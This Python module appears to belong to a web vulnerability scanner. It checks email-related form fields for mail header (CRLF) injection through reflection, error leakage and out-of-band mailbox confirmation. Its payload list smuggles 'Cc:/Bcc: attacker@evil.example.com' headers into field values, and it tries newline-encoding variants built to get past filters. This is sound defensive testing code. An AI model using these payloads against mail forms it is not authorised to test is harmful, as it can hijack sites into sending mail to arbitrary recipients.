"""
Mail Header Injection Scanner
Detects CRLF injection in email-related form fields (IPA: 1.8 メールヘッダ・インジェクション).

検知は 2 層構成:
  1. **ヒューリスティック**（OOB 不要）… 注入した CR/LF + Cc/Bcc ヘッダが応答へ
     そのまま反射する、またはメール構築エラーが漏えいする場合に検知する。
     ブラウザ経由の <input> では value sanitization で CR/LF が落ちることが多いが、
     URL パラメータや JSON/API 経路では成立し得る。
  2. **OOB（帯域外）確証**（``WSCAN_OOB_*`` 設定時）… 一意トークン宛の
     ``Bcc: <token>@<catch-all-domain>`` を注入し、対象アプリが実際に送った
     メールが OOB 受信箱へ届いたかをポーリングする。届けば「実際に外向きメールの
     ヘッダへ注入が反映された」確証となり、confidence=confirmed で記録する。

CR/LF が単純除去される素朴な防御に対しては、:func:`wscan.waf_bypass.crlf_bypass_variants`
が列挙する多様な改行表現（生 CR/LF・パーセント/二重エンコード・Unicode 行区切り・
オーバーロング UTF-8）でバイパスを試みる。
"""
import asyncio
import re
from typing import TYPE_CHECKING, Optional
from urllib.parse import urlsplit, urlunsplit, parse_qsl

import httpx

from wscan.injection_point import InjectionPoint

from .base import BaseScanner, Finding
from ..waf_bypass import crlf_bypass_variants

if TYPE_CHECKING:
    from wscan.engine import ScanEngine


# Field-name hints suggesting the value is used in a mail header.
# Long hints are substring-matched; short tokens (to/cc/bcc/from/...) are
# matched as whole words only -- otherwise we'd test unrelated fields
# such as ``token``, ``totp``, ``photo``, ``account``, ``stockton``, etc.
_MAIL_SUBSTRING_HINTS = (
    "email", "e_mail", "mail",
    "subject", "reply_to", "replyto",
    "sender", "recipient",
)
_MAIL_TOKEN_HINTS = frozenset({
    "to", "from", "cc", "bcc",
    "mailto", "mail_to",
    "reply", "replyto",
})


def _field_name_suggests_mail(field_name: str) -> bool:
    name = (field_name or "").lower().replace("-", "_").replace(" ", "_")
    if not name:
        return False
    if any(hint in name for hint in _MAIL_SUBSTRING_HINTS):
        return True
    # Token-style match: split on underscore and dot to handle names like
    # ``contact.to`` or ``mail_cc1``.  Trailing digits are stripped so
    # ``cc1`` / ``bcc_2`` still match without making ``cc`` match ``account``.
    import re as _re
    parts = _re.split(r"[._]", name)
    for part in parts:
        stripped = part.rstrip("0123456789")
        if stripped in _MAIL_TOKEN_HINTS:
            return True
    return False


# Injection payloads — each embeds CRLF variants to split headers (反射検知用)
MAIL_INJECTION_PAYLOADS = [
    "test@example.com\r\nCc: attacker@evil.example.com",
    "test@example.com\nCc: attacker@evil.example.com",
    "test@example.com%0aCc: attacker@evil.example.com",
    "test@example.com%0d%0aCc: attacker@evil.example.com",
    "test@example.com\r\nBcc: attacker@evil.example.com",
    # Subject-oriented injection
    "Hello\r\nCc: attacker@evil.example.com",
    "Hello%0d%0aCc: attacker@evil.example.com",
]

# Response patterns that suggest mail-construction error leakage
MAIL_ERROR_PATTERNS = [
    r"mail\(\)\s*failed",
    r"sendmail.*error",
    r"SMTP\s+error",
    r"could not send.*mail",
    r"failed to send.*mail",
    r"invalid.*mail\s+header",
    r"header.*injection",
]

# Compiled pattern to detect raw CRLF + injected Cc/Bcc reflected in the response body
_REFLECTED_INJECTION_RE = re.compile(
    r"(?:\r\n|\n)\s*(?:Cc|Bcc|To|From):\s*attacker", re.IGNORECASE
)

# OOB 受信を待つ最大秒数 / ポーリング間隔（OOB 設定時のみ使用）
OOB_WAIT_SECONDS = 45.0
OOB_POLL_INTERVAL = 5.0


def reflection_payloads() -> list[str]:
    """反射/エラー検知フェーズで投入するペイロード群（標準 + CRLF バイパス変種）。

    標準セットに加え、``waf_bypass.crlf_bypass_variants`` の改行表現バリエーションで
    ``Cc: attacker@evil.example.com`` を注入する変種を重複なしで足す（純粋関数）。
    """
    out: list[str] = list(MAIL_INJECTION_PAYLOADS)
    seen = set(out)
    for payload, _desc in crlf_bypass_variants(
        "test@example.com", "Cc: attacker@evil.example.com"
    ):
        if payload not in seen:
            seen.add(payload)
            out.append(payload)
    return out


def oob_payloads(oob_address: str) -> list[tuple[str, str]]:
    """OOB 確証フェーズで投入する ``(payload, 改行表現の説明)`` 群（純粋関数）。

    一意 OOB アドレス宛の ``Cc: <addr>`` を多様な改行表現で注入する。

    注入ヘッダに **Bcc ではなく Cc を使う**のは確証可能性のため: Bcc は配送時に
    削除されるのが通常で、受信メールのヘッダにも IMAP 検索にも現れず突合できない。
    Cc は配送後も可視ヘッダとして残り、``oob_email.parse_email`` が記録し
    ``EmailSink`` の IMAP CC 検索でも拾える。任意宛先を Cc に追加できる時点で
    メールヘッダインジェクションの成立を示せる。
    """
    if not oob_address:
        return []
    return list(crlf_bypass_variants("test@example.com", f"Cc: {oob_address}"))


class MailHeaderInjectionScanner(BaseScanner):
    """Mail header injection scanner targeting email-related form fields (IPA 1.8)."""

    CHECK_TYPE = "mail_header"
    SEVERITY = "high"
    SUPPORTS_JSON_BODY = False

    async def scan_injection_point(
        self,
        ip: InjectionPoint,
        field: dict,
    ) -> list[Finding]:
        # 生 HTTP transport は form/url_param 専用。未対応 JSON を誤送信しない。
        if ip.location == "json_body":
            return []

        field_name = ip.display_name or ip.parameter_id

        # Only test fields whose names suggest email header usage
        if not _field_name_suggests_mail(field_name):
            return []

        findings: list[Finding] = []

        if self.monitor:
            await self.monitor.emit_status(
                f"Mail header injection testing: {field_name} on {ip.url}"
            )

        # ── フェーズ 1: 反射 / エラー漏えいのヒューリスティック検知 ──────────
        heuristic = await self._scan_reflection(ip, field_name)
        findings.extend(heuristic)

        # ── フェーズ 2: OOB 確証（WSCAN_OOB_* 設定時のみ） ──────────────────
        oob = await self._scan_oob(ip, field_name)
        if oob:
            findings.append(oob)

        return findings

    async def scan_field(
        self,
        url: str,
        form_index: int,
        field: dict,
        is_url_param: bool = False,
    ) -> list[Finding]:
        """従来 API を InjectionPoint 駆動へ接続する互換 wrapper。"""
        name = field.get("name", "unknown")
        ip = (
            InjectionPoint.for_url_param(url, name)
            if is_url_param
            else InjectionPoint.for_form(url, name, form_index)
        )
        return await self.scan_injection_point(ip, field)

    async def _scan_reflection(
        self,
        ip: InjectionPoint,
        field_name: str,
    ) -> list[Finding]:
        """注入した CR/LF + ヘッダの反射、またはメールエラー漏えいを検知する。"""
        # ベースライン: CRLF を含まない良性値を投入し、常時出るメールエラーの
        # *パターン集合* を観測。メールサーバ停止や恒常的な「SMTP error」等は注入と
        # 無関係なので、ベースラインと同じパターンは除外する。一方、ベースラインに
        # 無い注入特有のエラー（例: invalid mail header）が新たに出た場合は記録する
        # （恒常エラーのある環境でも取りこぼさない）。
        baseline_patterns = await self._baseline_mail_error_patterns(ip, field_name)

        for payload in reflection_payloads():
            await self.log_payload_test(field_name, payload, "mail_header", ip.url)

            source, pair = await self._submit_probe(ip, payload)
            await asyncio.sleep(0.2 * self.sleep_factor)

            # Check 1: mail-related error message in response (leaks unsanitised input)。
            # ベースラインに無いエラーパターンが新たに出たときのみ記録する。
            new_patterns = self._matched_mail_error_patterns(source) - baseline_patterns
            if new_patterns:
                match = self.check_response_for_patterns(source, list(new_patterns))
                finding = await self.record_finding(
                    url=ip.url,
                    field_name=field_name,
                    payload=payload,
                    evidence=(
                        f"Possible mail header injection — mail error in response: '{match}'"
                    ),
                    pair=pair,
                    severity="high",
                    confidence="tentative",
                    evidence_type="mail_header_error",
                    injection_point=ip,
                )
                return [finding] if finding else []

            # Check 2: raw CRLF + injected header reflected verbatim in HTML body
            if _REFLECTED_INJECTION_RE.search(source):
                finding = await self.record_finding(
                    url=ip.url,
                    field_name=field_name,
                    payload=payload,
                    evidence=(
                        "Mail header injection: injected CRLF + Cc/Bcc header "
                        "reflected unescaped in the HTTP response body"
                    ),
                    pair=pair,
                    severity="high",
                    confidence="likely",
                    evidence_type="mail_header_reflected",
                    injection_point=ip,
                )
                return [finding] if finding else []

        return []

    @staticmethod
    def _matched_mail_error_patterns(body: str) -> set:
        """応答本文にマッチした ``MAIL_ERROR_PATTERNS`` の集合を返す（純粋）。"""
        out: set = set()
        for pat in MAIL_ERROR_PATTERNS:
            if re.search(pat, body or "", re.IGNORECASE | re.DOTALL):
                out.add(pat)
        return out

    async def _baseline_mail_error_patterns(
        self,
        ip: InjectionPoint,
        field_name: str,
    ) -> set:
        """CRLF を含まない良性値を投入し、恒常的に出るメールエラーのパターン集合を返す。

        この集合に含まれるパターンは注入と無関係（サーバ停止・恒常エラー等）なので
        Check 1 で除外する。一方この集合に**無い**パターンが注入時に新たに出れば、
        それは注入特有のエラーとして記録対象になる。失敗時は空集合（= 既知の恒常
        エラー無し）として従来挙動に倣う。
        """
        try:
            await self.log_payload_test(
                field_name, "baseline@example.com", "mail_header_baseline", ip.url
            )
            source, _pair = await self._submit_probe(ip, "baseline@example.com")
            await asyncio.sleep(0.2 * self.sleep_factor)
            return self._matched_mail_error_patterns(source)
        except Exception as exc:
            self._note_wave_degradation("mail_baseline", exc)
            return set()

    async def _scan_oob(
        self,
        ip: InjectionPoint,
        field_name: str,
    ) -> Optional[Finding]:
        """OOB メール受信で注入の実発火を確証する（OOB 未設定なら no-op）。

        CRLF 変種ごとに**別トークン**の Cc を注入することで、どの変種が実際に
        外向きメールを発火させたかを一意に識別する。確証された Finding は、
        その変種の payload / request-response pair に正しく帰属させる
        （取りこぼされた後続変種を誤って「確証済み」と記録しない）。
        """
        new_addr = getattr(self.engine, "new_oob_address", None)
        if not callable(new_addr):
            return None
        sink = getattr(self.engine, "oob_sink", None)
        if sink is None:
            return None

        # 変種 i に対し一意トークン i を割り当て、payload/pair を保持する。
        # 改行表現の列挙は決定論的なので、i 番目のトークンを i 番目の変種へ対応づけられる。
        attempts: list[dict] = []  # {token, payload, desc, pair}
        seps = crlf_bypass_variants("x", "Cc: x")  # 変種数の参照（順序は決定論的）
        for i in range(len(seps)):
            issued = new_addr()
            if not issued:
                break
            token, oob_addr = issued
            variants = oob_payloads(oob_addr)
            if i >= len(variants):
                break
            payload, desc = variants[i]
            await self.log_payload_test(field_name, payload, "mail_header", ip.url)
            _source, pair = await self._submit_probe(ip, payload)
            attempts.append(
                {"token": token, "address": oob_addr, "payload": payload,
                 "desc": desc, "pair": pair or {}}
            )
            await asyncio.sleep(0.2 * self.sleep_factor)

        if not attempts:
            return None

        if self.monitor:
            await self.monitor.emit_status(
                f"mail_header: waiting up to {OOB_WAIT_SECONDS:.0f}s for OOB mail "
                f"({len(attempts)} variants)"
            )

        try:
            hit = await asyncio.to_thread(self._poll_oob, sink, attempts)
        except Exception as exc:
            self._note_wave_degradation("mail_oob", exc)
            return None

        if not hit:
            return None
        attempt, received = hit

        return await self.record_finding(
            url=ip.url,
            field_name=field_name,
            payload=attempt["payload"],
            evidence=(
                "Mail header injection CONFIRMED via OOB: the application sent an "
                "email whose injected Cc reached the out-of-band mailbox "
                f"(token {attempt['token']}, {attempt['desc']} newline)."
            ),
            pair=attempt["pair"],
            severity="high",
            confidence="confirmed",
            evidence_type="mail_header_oob",
            evidence_details={
                "oob_token": attempt["token"],
                "oob_address": attempt["address"],
                "newline_variant": attempt["desc"],
                "received_subject": received.subject,
                "received_to": received.to_addrs,
            },
            injection_point=ip,
        )

    @staticmethod
    def _poll_oob(sink, attempts: list[dict]) -> "Optional[tuple[dict, object]]":
        """締切まで受信箱をポーリングし、最初に着信した変種を返す（同期）。

        ``asyncio.to_thread`` から呼ぶ前提のブロッキング・ヘルパー。1 ポーリングで
        ``fetch_recent`` を **1 回だけ**呼んで直近メールを取得し、全トークンを
        メモリ内で突合する（トークン毎に search すると毎回 IMAP/POP ログインが
        発生し、メールボックスを絞られて確証を取りこぼし得るため）。1 つでも着信
        したらその変種を返す（どの変種が発火したかの一意な帰属になる）。
        """
        import time as _time
        from wscan.oob_email import email_matches_token

        deadline = _time.time() + max(0.0, OOB_WAIT_SECONDS)
        while True:
            try:
                emails = sink.fetch_recent()
            except Exception:
                emails = []
            for received in emails:
                for attempt in attempts:
                    if email_matches_token(received, attempt["token"]):
                        return attempt, received
            if _time.time() >= deadline:
                return None
            _time.sleep(max(0.5, OOB_POLL_INTERVAL))

    async def _submit_probe(
        self,
        ip: InjectionPoint,
        payload: str,
    ) -> tuple[str, dict]:
        """注入プローブを投入する。生 HTTP 経路を優先し、不能ならブラウザへ。

        ブラウザの単一行 ``<input>`` は値設定時に CR/LF を除去し、``type=email``
        等は制約検証で送信自体を弾く。そのため CRLF を保つには DOM を介さない
        生 HTTP 送信が必要（メールヘッダ注入が実際にサーバへ到達する経路）。
        フォーム抽出や送信が失敗した場合のみ従来のブラウザ経由へフォールバックする。
        """
        try:
            # raw transport は共有 dispatch に混ぜず、legacy 引数を明示して呼ぶ。
            raw = await self._apply_payload_raw(
                ip.url,
                ip.submit_index,
                ip.parameter_id,
                payload,
                ip.legacy_is_url_param(),
            )
        except Exception as exc:
            raw = None
            self._note_wave_degradation("mail_raw_submit", exc)
        if raw is not None:
            return raw
        return await self._apply_ip(ip, payload)

    async def _apply_payload_raw(
        self,
        url: str,
        form_index: int,
        field_name: str,
        payload: str,
        is_url_param: bool,
    ) -> Optional[tuple[str, dict]]:
        """DOM を介さない生 HTTP 送信で CRLF を保ったままプローブを投入する。

        フォーム情報を取得できない場合は ``None`` を返し、呼び出し側が従来の
        ブラウザ経路へフォールバックできるようにする。

        フォームは**毎回再抽出**する（キャッシュしない）。ワンタイム CSRF/nonce な
        hidden 値を payload 間で使い回すとサーバに拒否され検出を逃すため。さらに、
        認証セッションは Playwright ブラウザコンテキスト側に存在し得るので、その
        cookie を httpx リクエストへ引き継ぐ（``engine.cookies`` だけでは
        ``--login-url`` / ``--cookie-file`` 由来のセッションが抜け落ち、未認証で
        ログインへリダイレクトされてしまう）。
        """
        if is_url_param:
            parts = urlsplit(url)
            params = dict(parse_qsl(parts.query, keep_blank_values=True))
            params[field_name] = payload
            action = urlunsplit((parts.scheme, parts.netloc, parts.path, "", ""))
            method, data, enctype = "GET", params, ""
        else:
            form = await self._extract_form(url, form_index)
            if not form:
                return None
            action = form["action"]
            method = form["method"]
            enctype = (form.get("enctype") or "").lower()
            data = dict(form["fields"])
            data[field_name] = payload

        client_kwargs: dict = {
            "timeout": getattr(self.engine, "timeout", 15),
            "follow_redirects": True,
        }
        if hasattr(self.engine, "httpx_client_kwargs"):
            client_kwargs = self.engine.httpx_client_kwargs(**client_kwargs)
        # cookie はブラウザコンテキストと engine.cookies を統合し、**スコープ
        # （domain/path）を保持した cookie jar** として渡す。素の name/value 辞書に
        # すると、フォーム action が別オリジンを指す場合に httpx が対象セッション
        # cookie を第三者へ送ってしまう（漏洩）。jar なら httpx がリクエスト URL に
        # マッチする cookie だけを送る。auth_headers の Cookie ヘッダと二重化しない
        # よう include_cookie=False で取得。
        if hasattr(self.engine, "auth_headers"):
            try:
                client_kwargs["headers"] = self.auth_headers_for_url(
                    action,
                    include_cookie=False,
                )
            except TypeError:
                client_kwargs["headers"] = self.engine.auth_headers()
        client_kwargs["cookies"] = await self._collect_cookies()

        async with httpx.AsyncClient(**client_kwargs) as client:
            if method == "GET":
                resp = await client.get(action, params=data)
            elif "multipart" in enctype:
                # multipart/form-data 必須のハンドラ向け。各フィールドを
                # ``(None, value)`` の非ファイルパートとして送ると multipart で
                # エンコードされ、値中の CR/LF も生のまま保持される（注入に有効）。
                files = {k: (None, v) for k, v in data.items()}
                resp = await client.post(action, files=files)
            else:
                resp = await client.post(action, data=data)
        body = resp.text
        pair = {
            "request": {"url": action, "method": method, "payload": payload},
            "response": {"status": resp.status_code, "body": body[:2000]},
        }
        return body, pair

    async def _collect_cookies(self) -> "httpx.Cookies":
        """raw httpx 用の **スコープ付き** cookie jar を返す。

        ``engine.cookies``（``--cookie`` の明示文字列。scan 対象ホストにスコープ）に
        加え、Playwright ブラウザコンテキストの cookie（``--login-url`` /
        ``--cookie-file`` 由来）を *元の domain/path を保持したまま* 重ねる。
        httpx はリクエスト URL にマッチする cookie だけを送るため、別オリジンの
        フォーム action へ対象セッション cookie を漏らさない。取得不能・未配線なら
        空 jar。
        """
        jar = httpx.Cookies()
        target_host = urlsplit(getattr(self.engine, "target_url", "") or "").hostname or ""
        # ① engine.cookies（"a=b; c=d" 形式）。対象ホストにスコープする。
        raw = getattr(self.engine, "cookies", "") or ""
        if target_host:
            for part in raw.split(";"):
                if "=" in part:
                    k, v = part.split("=", 1)
                    k = k.strip()
                    if k:
                        jar.set(k, v.strip(), domain=target_host, path="/")
        # ② ブラウザコンテキストの cookie（domain/path を保持して優先）。
        try:
            context = self.browser.page.context
            for c in await context.cookies():
                name = c.get("name")
                if not name:
                    continue
                domain = c.get("domain") or target_host
                if not domain:
                    continue
                jar.set(name, c.get("value", ""), domain=domain, path=c.get("path") or "/")
        except Exception:
            pass
        return jar

    # フォーム情報を抽出する JS（action 絶対URL / method / 既定値つきフィールド辞書）。
    # 名前付き submit/image ボタンは **先頭の 1 つだけ** name=value で含める。バック
    # エンドが送信ボタンのパラメータ（例: send=Send）でメール送信を分岐することがあり、
    # これを落とすと反射/OOB 検査が実際の脆弱性を取りこぼすため（ブラウザは押した
    # ボタン 1 つだけ送るので先頭のみ採用する）。reset / type=button / file は非送信の
    # ため除外する。
    _EXTRACT_FORM_JS = """
        ([formIndex]) => {
            const form = document.querySelectorAll('form')[formIndex];
            if (!form) return null;
            const fields = {};
            let submitAdded = false;
            form.querySelectorAll('input, textarea, select, button').forEach(el => {
                const name = el.name || el.id;
                if (!name) return;
                const tag = el.tagName.toLowerCase();
                const type = (el.type || (tag === 'button' ? 'submit' : 'text')).toLowerCase();
                if (type === 'submit' || type === 'image') {
                    if (!submitAdded) {
                        fields[name] = el.value || '';
                        submitAdded = true;
                    }
                    return;
                }
                if (['button', 'reset', 'file'].includes(type)) return;
                if (el.tagName === 'SELECT') {
                    const opts = Array.from(el.options).filter(o => o.value !== '');
                    fields[name] = el.value || (opts.length ? opts[0].value : '');
                    return;
                }
                if (type === 'checkbox' || type === 'radio') {
                    if (el.checked) fields[name] = el.value || 'on';
                    return;
                }
                // hidden は実値（CSRF トークン等）または意図的な空（ハニーポット/
                // anti-bot）なので、デフォルト補完せず値をそのまま保持する。空欄を
                // 'test' で埋めるとハニーポット検知でサーバに拒否され偽陰性になる。
                if (type === 'hidden') {
                    fields[name] = el.value;
                    return;
                }
                let v = el.value;
                if (!v) {
                    v = (type === 'email' || /mail/.test(name.toLowerCase()))
                        ? 'tester@example.com' : 'test';
                }
                fields[name] = v;
            });
            return {
                action: form.action || window.location.href,
                method: (form.method || 'GET').toUpperCase(),
                enctype: (form.enctype || form.getAttribute('enctype')
                          || 'application/x-www-form-urlencoded').toLowerCase(),
                fields: fields
            };
        }
    """

    async def _extract_form(self, url: str, form_index: int) -> Optional[dict]:
        """対象フォームの action/method/フィールド既定値を**毎回**抽出する。

        キャッシュしないのは、ワンタイム CSRF/nonce な hidden 値を payload 間で
        使い回すとサーバに拒否され検出を逃すため。投入直前に navigate して
        新鮮なトークンを取り込む（同時に同セッションの cookie が
        ``_collect_cookies`` で送出され、トークンと cookie が整合する）。
        """
        await self.browser.navigate(url)
        result = await self.browser.page.evaluate(self._EXTRACT_FORM_JS, [form_index])
        if not result or not result.get("action"):
            return None
        return result

    async def _apply_payload(
        self,
        url: str,
        form_index: int,
        field_name: str,
        payload: str,
        is_url_param: bool,
    ) -> tuple[str, dict]:
        try:
            if is_url_param:
                return await self.browser.test_url_param(url, field_name, payload)
            else:
                await self.browser.navigate(url)
                return await self.browser.fill_and_submit_form(
                    form_index, field_name, payload
                )
        except Exception as exc:
            self._record_scan_note(
                f"transport_error:{self.CHECK_TYPE}:{type(exc).__name__}"
            )
            if self.monitor:
                await self.monitor.emit_status(
                    f"[warn] mail_header: _apply_payload failed on {field_name} @ {url}: {exc}"
                )
            return "", {}
